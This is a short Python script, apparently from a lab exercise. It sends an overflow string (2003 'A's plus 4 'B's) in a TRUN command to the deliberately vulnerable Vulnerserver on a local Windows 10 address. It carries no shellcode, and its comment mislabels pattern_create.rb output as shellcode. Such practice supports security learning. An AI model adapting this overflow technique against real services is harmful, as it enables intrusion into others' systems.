#!/usr/bin/python
#buffer overflow attack 
#vulnerserver.exe running on windows 10 machine.
#shellcode is generated by /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5900

import socket
import sys
shellcode="A"*2003+4*"B"

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #socket.AF_INET: ipv4, SOCK_STREAM: port
    #port 9999 is the default open port of vulnerserver
    #ip is the ip of windows 10 
connect=s.connect(('192.168.179.134',9999))
s.send(('TRUN /.:/'+shellcode))
s.close()
